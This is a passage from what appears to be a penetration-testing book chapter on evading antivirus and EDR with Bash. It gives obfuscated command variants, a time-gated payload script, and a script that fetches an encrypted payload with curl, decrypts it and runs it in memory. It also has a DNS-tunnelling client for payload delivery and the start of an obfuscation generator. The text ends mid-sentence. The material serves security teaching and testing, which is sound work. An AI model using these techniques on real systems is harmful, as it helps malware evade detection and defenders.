   <p>
    <span class="koboSpan" id="kobo.216.1">
     Brace expansion is also useful for breaking string detection, as
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.217.1">
      shown here:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.218.1">
$ {s,u,d,o}" "-{l}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.219.1">
     The following example implements command substitution
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.220.1">
      with
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.221.1">
       cut
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.222.1">
      :
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.223.1">
$ $(cut -c1-4 &lt;&lt;&lt; "sudo sudo") $(cut -c1-2 &lt;&lt;&lt; "-l -l")</span></pre>
   <p>
    <span class="koboSpan" id="kobo.224.1">
     We can also use ASCII decimal values, as
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.225.1">
      shown here:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.226.1">
$ $(printf "\x$(printf '%x' 115)\x$(printf '%x' 117)\x$(printf '%x' 100)\x$(printf '%x' 111)") $(printf "\x$(printf '%x' 45)\x$(printf '%x' 108)")</span></pre>
   <p>
    <span class="koboSpan" id="kobo.227.1">
     Each of these methods obfuscates the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.228.1">
      sudo -l
     </span>
    </strong>
    <span class="koboSpan" id="kobo.229.1">
     command in a different way.
    </span>
    <span class="koboSpan" id="kobo.229.2">
     These techniques can be combined and nested to create more complex obfuscation.
    </span>
    <span class="koboSpan" id="kobo.229.3">
     However, it’s important to note that modern security solutions are often capable of detecting these obfuscation attempts.
    </span>
    <span class="koboSpan" id="kobo.229.4">
     These methods are more effective against simple pattern matching, also
    </span>
    <a id="_idIndexMarker890">
    </a>
    <span class="koboSpan" id="kobo.230.1">
     known as
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.231.1">
      signature-based
     </span>
    </strong>
    <span class="No-Break">
     <strong class="bold">
      <span class="koboSpan" id="kobo.232.1">
       detection systems
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.233.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.234.1">
     When testing these obfuscation techniques against EDR systems, observe how each method affects detection rates.
    </span>
    <span class="koboSpan" id="kobo.234.2">
     Some EDR solutions might detect certain obfuscation techniques while missing others.
    </span>
    <span class="koboSpan" id="kobo.234.3">
     This information can be valuable for understanding the capabilities and
    </span>
    <a id="_idIndexMarker891">
    </a>
    <span class="koboSpan" id="kobo.235.1">
     limitations
    </span>
    <a id="_idIndexMarker892">
    </a>
    <span class="koboSpan" id="kobo.236.1">
     of the EDR system
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.237.1">
      being tested.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.238.1">
     We’ll try more advanced technique
    </span>
    <a id="_idTextAnchor539">
    </a>
    <a id="_idTextAnchor540">
    </a>
    <span class="koboSpan" id="kobo.239.1">
     s in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.240.1">
      next section.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-218">
    <a id="_idTextAnchor541">
    </a>
    <span class="koboSpan" id="kobo.241.1">
     Advanced evasion tactics using Bash
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.242.1">
     While basic
    </span>
    <a id="_idIndexMarker893">
    </a>
    <span class="koboSpan" id="kobo.243.1">
     obfuscation techniques can be effective, more
    </span>
    <a id="_idIndexMarker894">
    </a>
    <span class="koboSpan" id="kobo.244.1">
     sophisticated evasion tactics are often necessary to bypass advanced security measures.
    </span>
    <span class="koboSpan" id="kobo.244.2">
     This section explores advanced evasion methods
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.245.1">
      using Bash.
     </span>
    </span>
   </p>
   <p>
    <strong class="bold">
     <span class="koboSpan" id="kobo.246.1">
      Timing-based evasion
     </span>
    </strong>
    <span class="koboSpan" id="kobo.247.1">
     involves
    </span>
    <a id="_idIndexMarker895">
    </a>
    <span class="koboSpan" id="kobo.248.1">
     executing code based on specific time conditions, making it harder for security solutions to detect malicious activity.
    </span>
    <span class="koboSpan" id="kobo.248.2">
     For example, I’ve bypassed AV on multiple occasions by encoding or encrypting my payloads in the script or executable and inserting code to make it sleep for some time before decoding or decrypting and running the payload.
    </span>
    <span class="koboSpan" id="kobo.248.3">
     AV and EDR vendors do not want to upset customers by taking up valuable system resources or making the system appear to be slow.
    </span>
    <span class="koboSpan" id="kobo.248.4">
     Therefore, sometimes simple pauses for a few minutes before performing malicious
    </span>
    <a id="_idTextAnchor542">
    </a>
    <a id="_idTextAnchor543">
    </a>
    <span class="koboSpan" id="kobo.249.1">
     activity are all
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.250.1">
      you need.
     </span>
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.251.1">
     Tip
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.252.1">
     AV and EDR vendors are catching on to the use of simple sleep statements.
    </span>
    <span class="koboSpan" id="kobo.252.2">
     It’s often necessary to use techniques more complex than a call to the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.253.1">
      sleep()
     </span>
    </strong>
    <span class="koboSpan" id="kobo.254.1">
     function, such as performing some random task before checking to see how much time
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.255.1">
      has elapsed.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.256.1">
     The following script example avoids using sleep statements by executing benign activities and checks to ensure the time is between 1 and 3 A.M.
    </span>
    <span class="koboSpan" id="kobo.256.2">
     before executing the payload.
    </span>
    <span class="koboSpan" id="kobo.256.3">
     It can be found in this chapter’s GitHub repos
    </span>
    <a id="_idTextAnchor544">
    </a>
    <a id="_idTextAnchor545">
    </a>
    <a id="_idTextAnchor546">
    </a>
    <span class="koboSpan" id="kobo.257.1">
     itory
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.258.1">
      as
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.259.1">
       ch14_sleep_1.sh
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.260.1">
      :
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.261.1">
#!/usr/bin/env bash
current_hour=$(date +%H)
if [ $current_hour -ge 1 ] &amp;&amp; [ $current_hour -lt 3 ]; then
    # Execute payload only between 1 AM and 3 AM
    echo "Executing payload..."
</span><span class="koboSpan" id="kobo.261.2">    # Add your payload here
else
    # Perform benign activity
    echo "System check completed."
</span><span class="koboSpan" id="kobo.261.3">fi</span></pre>
   <p>
    <span class="koboSpan" id="kobo.262.1">
     Alternatively, you
    </span>
    <a id="_idIndexMarker896">
    </a>
    <span class="koboSpan" id="kobo.263.1">
     can use the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.264.1">
      sleep 600
     </span>
    </strong>
    <span class="koboSpan" id="kobo.265.1">
     command to
    </span>
    <a id="_idIndexMarker897">
    </a>
    <span class="koboSpan" id="kobo.266.1">
     sleep for 10 minutes before executing the payload.
    </span>
    <span class="koboSpan" id="kobo.266.2">
     Additionally, you can make detection even more difficult by fetching the payload from an HTTPS URL and decoding or decrypting it after the sleep statement before execution instead of storing it in the script.
    </span>
    <span class="koboSpan" id="kobo.266.3">
     Most AV systems would initially scan the file and not find any evidence of malicious content, then not detect any malicious activity, and eventually stop monitoring
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.267.1">
      the file.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.268.1">
     In the case of EDR, a simple sleep statement may not be sufficient to evade detection if a file, process, or network signature is detected.
    </span>
    <span class="koboSpan" id="kobo.268.2">
     In cases such as this, you may be able to avoid detection by spreading the activity out over multiple commands or steps and inserting time between each step.
    </span>
    <span class="koboSpan" id="kobo.268.3">
     Multiple actions occurring in the attack chain within a specific time frame may generate a high or critical severity alert.
    </span>
    <span class="koboSpan" id="kobo.268.4">
     However, if you insert enough time between the actions, you may evade detection, or each step may alert at a lower severity and avoid scrutiny by
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.269.1">
      the defenders.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.270.1">
     The script has been modified to insert time between each step.
    </span>
    <span class="koboSpan" id="kobo.270.2">
     The following script can be found in this chapter’s GitHub rep
    </span>
    <a id="_idTextAnchor547">
    </a>
    <a id="_idTextAnchor548">
    </a>
    <span class="koboSpan" id="kobo.271.1">
     ository
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.272.1">
      as
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.273.1">
       ch14_sleep_2.sh
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.274.1">
      :
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.275.1">
#!/usr/bin/env bash
sleep 600
# URL of the encrypted payload
PAYLOAD_URL="https://example.com/encrypted_payload.bin"
# Encryption key (in hexadecimal format)
KEY="5ebe2294ecd0e0f08eab7690d2a6ee69"
# Retrieve the encrypted payload and decrypt it in memory
decrypted_payload=$(curl -s "$PAYLOAD_URL" | openssl enc -aes-256-cbc -d -K "$KEY" -iv 0000000000000000 | base64)
sleep 7200
# Execute the decrypted payload from memory
bash &lt;(echo "$decrypted_payload" | base64 -d)</span></pre>
   <p>
    <span class="koboSpan" id="kobo.276.1">
     If you want to be even more stealthy, you should avoid using
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.277.1">
      curl
     </span>
    </strong>
    <span class="koboSpan" id="kobo.278.1">
     or
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.279.1">
      wget
     </span>
    </strong>
    <span class="koboSpan" id="kobo.280.1">
     to fetch payloads and instead use DNS.
    </span>
    <span class="koboSpan" id="kobo.280.2">
     The following example includes server- and client-side code for transferring data over DNS.
    </span>
    <span class="koboSpan" id="kobo.280.3">
     You would implement the client-side code in your Bash
    </span>
    <a id="_idIndexMarker898">
    </a>
    <span class="koboSpan" id="kobo.281.1">
     script, replacing
    </span>
    <a id="_idIndexMarker899">
    </a>
    <span class="koboSpan" id="kobo.282.1">
     any use of
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.283.1">
      curl
     </span>
    </strong>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.284.1">
      or
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.285.1">
       wget
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.286.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.287.1">
     The server-side code can be found in this chapter’s GitHub repository as
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.288.1">
      ch14_dns_server.py
     </span>
    </strong>
    <span class="koboSpan" id="kobo.289.1">
     .
    </span>
    <span class="koboSpan" id="kobo.289.2">
     The following client-side code can be found in this chapter’s GitHub repository
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.290.1">
      as
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.291.1">
       ch14_dns_client.sh
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.292.1">
      :
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.293.1">
#!/usr/bin/env bash
SERVER_IP="10.2.10.99" #Replace with your actual server IP
DOMAIN="example.com"
function retrieve_data() {
    local key="$1"
    echo "Sending query for: $key.get.$DOMAIN to $SERVER_IP"
    local result=$(dig @$SERVER_IP +short TXT "$key.get.$DOMAIN")
    if [ -n "$result" ]; then
        # Remove quotes and decode
        local decoded=$(echo $result | tr -d '"' | base64 -d 2&gt;/dev/null)
        if [ $? </span><span class="koboSpan" id="kobo.293.2">-eq 0 ]; then
            echo "Retrieved data for '$key': $decoded"
        else
            echo "Error decoding data for '$key'. </span><span class="koboSpan" id="kobo.293.3">Raw data: $result"
        fi
    else
        echo "No data found for '$key'"
    fi
    echo "-------------------"
}
# Example usage
retrieve_data "weather"
retrieve_data "news"
retrieve_data "quote"
retrieve_data "nonexistent"</span></pre>
   <p>
    <span class="koboSpan" id="kobo.294.1">
     The output of the
    </span>
    <a id="_idIndexMarker900">
    </a>
    <span class="koboSpan" id="kobo.295.1">
     client
    </span>
    <a id="_idIndexMarker901">
    </a>
    <span class="koboSpan" id="kobo.296.1">
     can be found in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.297.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer208">
     <span class="koboSpan" id="kobo.298.1">
      <img alt="Figure 14.2 – The output of the DNS client is shown" src="image/B22229_14_02.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.299.1">
     Figure 14.2 – The output of the DNS client is shown
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.300.1">
     Important note
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.301.1">
     You will have to edit the server and client yourself to modify it to send payloads suitable for pentesting operations.
    </span>
    <span class="koboSpan" id="kobo.301.2">
     This is simply a framework.
    </span>
    <span class="koboSpan" id="kobo.301.3">
     You can encode or encrypt the data before transferring it, then decode or decrypt it on the client side and run the code fully in memory to avoid writing
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.302.1">
      to disk.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.303.1">
     The following
    </span>
    <a id="_idIndexMarker902">
    </a>
    <span class="koboSpan" id="kobo.304.1">
     provides an
    </span>
    <a id="_idIndexMarker903">
    </a>
    <span class="koboSpan" id="kobo.305.1">
     explanation of the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.306.1">
      retrieve_data
     </span>
    </strong>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.307.1">
      function code:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.308.1">
       local key="$1"
      </span>
     </strong>
     <span class="koboSpan" id="kobo.309.1">
      : This line declares a local variable,
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.310.1">
       key
      </span>
     </strong>
     <span class="koboSpan" id="kobo.311.1">
      , and assigns it the value of the first argument passed to
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.312.1">
       the function.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.313.1">
       echo "Sending query for: $key.get.$DOMAIN to $SERVER_IP"
      </span>
     </strong>
     <span class="koboSpan" id="kobo.314.1">
      : This line prints a message indicating what query is
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.315.1">
       being sent.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.316.1">
       local result=$(dig @$SERVER_IP +short TXT "$key.get.$DOMAIN")
      </span>
     </strong>
     <span class="koboSpan" id="kobo.317.1">
      : This is the core of the function, using the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.318.1">
       dig
      </span>
     </strong>
     <span class="koboSpan" id="kobo.319.1">
      command to perform a DNS query.
     </span>
     <span class="koboSpan" id="kobo.319.2">
      Let’s break
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.320.1">
       it down:
      </span>
     </span>
     <ul>
      <li>
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.321.1">
         dig
        </span>
       </strong>
       <span class="koboSpan" id="kobo.322.1">
        : This is a DNS
       </span>
       <span class="No-Break">
        <span class="koboSpan" id="kobo.323.1">
         lookup utility.
        </span>
       </span>
      </li>
      <li>
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.324.1">
         @$SERVER_IP
        </span>
       </strong>
       <span class="koboSpan" id="kobo.325.1">
        : This variable specifies the DNS server to query (your
       </span>
       <span class="No-Break">
        <span class="koboSpan" id="kobo.326.1">
         custom server).
        </span>
       </span>
      </li>
      <li>
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.327.1">
         +short
        </span>
       </strong>
       <span class="koboSpan" id="kobo.328.1">
        : This tells
       </span>
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.329.1">
         dig
        </span>
       </strong>
       <span class="koboSpan" id="kobo.330.1">
        to give a terse answer.
       </span>
       <span class="koboSpan" id="kobo.330.2">
        For a
       </span>
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.331.1">
         TXT
        </span>
       </strong>
       <span class="koboSpan" id="kobo.332.1">
        record, this returns only the
       </span>
       <span class="No-Break">
        <span class="koboSpan" id="kobo.333.1">
         text data.
        </span>
       </span>
      </li>
      <li>
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.334.1">
         TXT
        </span>
       </strong>
       <span class="koboSpan" id="kobo.335.1">
        : This specifies that we’re looking for a
       </span>
       <span class="No-Break">
        <strong class="source-inline">
         <span class="koboSpan" id="kobo.336.1">
          TXT
         </span>
        </strong>
       </span>
       <span class="No-Break">
        <span class="koboSpan" id="kobo.337.1">
         record.
        </span>
       </span>
      </li>
      <li>
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.338.1">
         "$key.get.$DOMAIN"
        </span>
       </strong>
       <span class="koboSpan" id="kobo.339.1">
        : This is the full domain name we’re querying, constructed with the
       </span>
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.340.1">
         key
        </span>
       </strong>
       <span class="koboSpan" id="kobo.341.1">
        variable, the word
       </span>
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.342.1">
         get
        </span>
       </strong>
       <span class="koboSpan" id="kobo.343.1">
        , and the
       </span>
       <span class="No-Break">
        <strong class="source-inline">
         <span class="koboSpan" id="kobo.344.1">
          DOMAIN
         </span>
        </strong>
       </span>
       <span class="No-Break">
        <span class="koboSpan" id="kobo.345.1">
         variable.
        </span>
       </span>
      </li>
      <li>
       <span class="koboSpan" id="kobo.346.1">
        The entire command is wrapped in
       </span>
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.347.1">
         $()
        </span>
       </strong>
       <span class="koboSpan" id="kobo.348.1">
        , which is a command substitution.
       </span>
       <span class="koboSpan" id="kobo.348.2">
        It runs the command and returns its output, which is then assigned to the
       </span>
       <span class="No-Break">
        <strong class="source-inline">
         <span class="koboSpan" id="kobo.349.1">
          result
         </span>
        </strong>
       </span>
       <span class="No-Break">
        <span class="koboSpan" id="kobo.350.1">
         variable.
        </span>
       </span>
      </li>
     </ul>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.351.1">
       if [ -n "$result" ]; then
      </span>
     </strong>
     <span class="koboSpan" id="kobo.352.1">
      : This checks whether the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.353.1">
       result
      </span>
     </strong>
     <span class="koboSpan" id="kobo.354.1">
      variable
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.355.1">
       is non-empty.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.356.1">
      Inside the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.357.1">
       if
      </span>
     </strong>
     <span class="koboSpan" id="kobo.358.1">
      block, we
     </span>
     <a id="_idIndexMarker904">
     </a>
     <span class="koboSpan" id="kobo.359.1">
      have
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.360.1">
       the
      </span>
     </span>
     <span class="No-Break">
      <a id="_idIndexMarker905">
      </a>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.361.1">
       following:
      </span>
     </span>
     <ul>
      <li>
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.362.1">
         local decoded=$(echo $result | tr -d '"' | base64 -d 2&gt;/dev/null)
        </span>
       </strong>
       <span class="koboSpan" id="kobo.363.1">
        : This line processes
       </span>
       <span class="No-Break">
        <span class="koboSpan" id="kobo.364.1">
         the result:
        </span>
       </span>
       <ul>
        <li>
         <strong class="source-inline">
          <span class="koboSpan" id="kobo.365.1">
           echo $result
          </span>
         </strong>
         <span class="koboSpan" id="kobo.366.1">
          : Outputs
         </span>
         <span class="No-Break">
          <span class="koboSpan" id="kobo.367.1">
           the result
          </span>
         </span>
        </li>
        <li>
         <strong class="source-inline">
          <span class="koboSpan" id="kobo.368.1">
           tr -d '"'
          </span>
         </strong>
         <span class="koboSpan" id="kobo.369.1">
          : Removes any
         </span>
         <span class="No-Break">
          <span class="koboSpan" id="kobo.370.1">
           quote characters
          </span>
         </span>
        </li>
        <li>
         <strong class="source-inline">
          <span class="koboSpan" id="kobo.371.1">
           base64 -d
          </span>
         </strong>
         <span class="koboSpan" id="kobo.372.1">
          : Decodes the
         </span>
         <span class="No-Break">
          <span class="koboSpan" id="kobo.373.1">
           Base64-encoded string
          </span>
         </span>
        </li>
        <li>
         <strong class="source-inline">
          <span class="koboSpan" id="kobo.374.1">
           2&gt;/dev/null
          </span>
         </strong>
         <span class="koboSpan" id="kobo.375.1">
          : Redirects any error messages to
         </span>
         <strong class="source-inline">
          <span class="koboSpan" id="kobo.376.1">
           /dev/null
          </span>
         </strong>
         <span class="koboSpan" id="kobo.377.1">
          (
         </span>
         <span class="No-Break">
          <span class="koboSpan" id="kobo.378.1">
           discards them)
          </span>
         </span>
        </li>
       </ul>
      </li>
     </ul>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.379.1">
       if [ $?
      </span>
      <span class="koboSpan" id="kobo.379.2">
       -eq 0 ]; then
      </span>
     </strong>
     <span class="koboSpan" id="kobo.380.1">
      : This checks whether the previous command (the Base64 decoding)
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.381.1">
       was successful:
      </span>
     </span>
     <ul>
      <li>
       <span class="koboSpan" id="kobo.382.1">
        If successful, it prints the decoded data.
       </span>
       <span class="koboSpan" id="kobo.382.2">
        If not, it prints an error message with the
       </span>
       <span class="No-Break">
        <span class="koboSpan" id="kobo.383.1">
         raw data.
        </span>
       </span>
      </li>
      <li>
       <span class="koboSpan" id="kobo.384.1">
        If
       </span>
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.385.1">
         result
        </span>
       </strong>
       <span class="koboSpan" id="kobo.386.1">
        is empty, it prints
       </span>
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.387.1">
         No data found
        </span>
       </strong>
       <span class="No-Break">
        <strong class="source-inline">
         <span class="koboSpan" id="kobo.388.1">
          for '{$key}'
         </span>
        </strong>
       </span>
       <span class="No-Break">
        <span class="koboSpan" id="kobo.389.1">
         .
        </span>
       </span>
      </li>
      <li>
       <span class="koboSpan" id="kobo.390.1">
        Finally, it prints a
       </span>
       <span class="No-Break">
        <span class="koboSpan" id="kobo.391.1">
         separator line.
        </span>
       </span>
      </li>
     </ul>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.392.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.393.1">
      dig
     </span>
    </strong>
    <span class="koboSpan" id="kobo.394.1">
     command is very important here.
    </span>
    <span class="koboSpan" id="kobo.394.2">
     It’s using DNS to transmit data, querying a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.395.1">
      TXT
     </span>
    </strong>
    <span class="koboSpan" id="kobo.396.1">
     record for a domain name that includes the key we’re interested in.
    </span>
    <span class="koboSpan" id="kobo.396.2">
     The server responds with Base64-encoded data in the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.397.1">
      TXT
     </span>
    </strong>
    <span class="koboSpan" id="kobo.398.1">
     record, which the client
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.399.1">
      then decodes.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.400.1">
     This method of using DNS for data transfer is sometimes
    </span>
    <a id="_idIndexMarker906">
    </a>
    <span class="koboSpan" id="kobo.401.1">
     called
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.402.1">
      DNS tunneling
     </span>
    </strong>
    <span class="koboSpan" id="kobo.403.1">
     or
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.404.1">
      DNS exfiltration
     </span>
    </strong>
    <span class="koboSpan" id="kobo.405.1">
     .
    </span>
    <span class="koboSpan" id="kobo.405.2">
     It’s
    </span>
    <a id="_idIndexMarker907">
    </a>
    <span class="koboSpan" id="kobo.406.1">
     a creative way of transmitting data using a protocol (DNS) that’s often allowed through firewalls, even when other protocols
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.407.1">
      are blocked.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.408.1">
     Having explored a
    </span>
    <a id="_idIndexMarker908">
    </a>
    <span class="koboSpan" id="kobo.409.1">
     variety
    </span>
    <a id="_idIndexMarker909">
    </a>
    <span class="koboSpan" id="kobo.410.1">
     of ways to obfuscate payloads to bypass AV or EDR detection, let’s move on to the next section and explore usin
    </span>
    <a id="_idTextAnchor549">
    </a>
    <a id="_idTextAnchor550">
    </a>
    <span class="koboSpan" id="kobo.411.1">
     g Bash to automate
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.412.1">
      script obfuscation.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-219">
    <a id="_idTextAnchor551">
    </a>
    <span class="koboSpan" id="kobo.413.1">
     Automating evasion script generation in Bash
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.414.1">
     To automate the
    </span>
    <a id="_idIndexMarker910">
    </a>
    <span class="koboSpan" id="kobo.415.1">
     generation of obfuscated Bash
    </span>
    <a id="_idIndexMarker911">
    </a>
    <span class="koboSpan" id="kobo.416.1">
     scripts, we’ll create a simple framework that combines various evasion techniques.
    </span>
    <span class="koboSpan" id="kobo.416.2">
     This framework will allow us to quickly produce scripts that are more likely to evade detection by AV and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.417.1">
      EDR systems.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.418.1">
     Here’s a basic structure for our framework.
    </span>
    <span class="koboSpan" id="kobo.418.2">
     The following code can be foun
    </span>
    <a id="_idTextAnchor552">
    </a>
    <a id="_idTextAnchor553">
    </a>
    <span class="koboSpan" id="kobo.419.1">
     d in this chapter’s GitHub repository as
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.420.1">
      ch14_auto_obfuscate_1.sh
     </span>
    </strong>
    <span class="koboSpan" id="kobo.421.1">
     .
    </span>
    <span class="koboSpan" id="kobo.421.2">
     I’ll be breaking the code down into s
    </span>
    <a id="_idTextAnchor554">
    </a>
    <a id="_idTextAnchor555">
    </a>
    <span class="koboSpan" id="kobo.422.1">
     maller sections to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.423.1">
      provide explanations:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.424.1">
#!/usr/bin/env bash
# Function to encode a string using base64
encode_base64() {
    echo "$1" | base64
}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.425.1">
     The preceding code block provides a function to Base64 encode any data passed to the function.
    </span>
    <span class="koboSpan" id="kobo.425.2">
     In the next part of the code, a function is provided to use the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.426.1">
      openssl
     </span>
    </strong>
    <span class="koboSpan" id="kobo.427.1">
     program to generate random variable names compos
    </span>
    <a id="_idTextAnchor556">
    </a>
    <a id="_idTextAnchor557">
    </a>
    <span class="koboSpan" id="kobo.428.1">
     ed of four-digit
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.429.1">
      hexadecimal characters:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.430.1">
# Function to obfuscate variable names
obfuscate_var_name() {
    echo "var_$(openssl rand -hex 4)"
}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.431.1">
     Then, the Bash code converts the contents of the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.432.1">
      cmd
     </span>
    </strong>
    <span class="koboSpan" id="kobo.433.1">
     variable into a space-free, newline
    </span>
    <a id="_idTextAnchor558">
    </a>
    <a id="_idTextAnchor559">
    </a>
    <span class="koboSpan" id="kobo.434.1">
     -free hexadecimal
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.435.1">
      string representation:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.436.1">
# Function to obfuscate a command using command substitution
obfu</span><a id="_idTextAnchor560"/><a id="_idTextAnchor561"/><span class="koboSpan" id="kobo.437.1">scate_command() {
    </span><a id="_idTextAnchor562"/><a id="_idTextAnchor563"/><span class="koboSpan" id="kobo.438.1">local cmd="$1"
    echo "$(echo "$cmd" | od -A n -t x1 | tr -d ' \n')"
}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.439.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.440.1">
      od
     </span>
    </strong>
    <span class="koboSpan" id="kobo.441.1">
     utility is being introduced here.
    </span>
    <span class="koboSpan" id="kobo.441.2">
     It’s used to output data in various formats.
    </span>
    <span class="koboSpan" id="kobo.441.3">
     The
    </span>
    <strong class="source-inline">
